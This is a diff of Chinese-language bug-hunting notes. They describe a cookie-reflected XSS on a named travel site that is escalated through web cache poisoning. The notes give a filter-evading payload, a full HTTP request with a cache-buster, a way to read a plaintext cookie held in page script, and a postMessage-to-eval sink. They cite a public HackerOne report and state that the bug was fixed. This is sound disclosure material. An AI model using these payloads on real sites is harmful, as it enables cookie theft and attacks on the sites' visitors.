@@ -20,6 +20,24 @@ cookie: hav=xxx 反射到页面上
 payload:cookie:  hav=xss"</sc"ript><sv"g/onloa"d=al"ert"(document.do"main)>
 缓存投毒，http响应里的头Cache-Control和Expires表明可以缓存
 还发现cookie明文存储在页面js的这个变量window.INITIAL_STATE.system.cookie
-
+直接alert(window.INITIAL_STATE.system.cookie)
 厂商通过去除hav反射在页面修复该问题
 邦邦的https://hackerone.com/reports/1760213
+
+```
+GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
+Host: www.abritel.fr
+Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
+Upgrade-Insecure-Requests: 1
+Te: trailers
+```
+.js触发缓存。?xxxd缓存破坏器
+
+5.postmessage相关的xss
+网页存在代码![[Pasted image 20241017232723.png]]
+e.data有exec的话就用eval执行代码
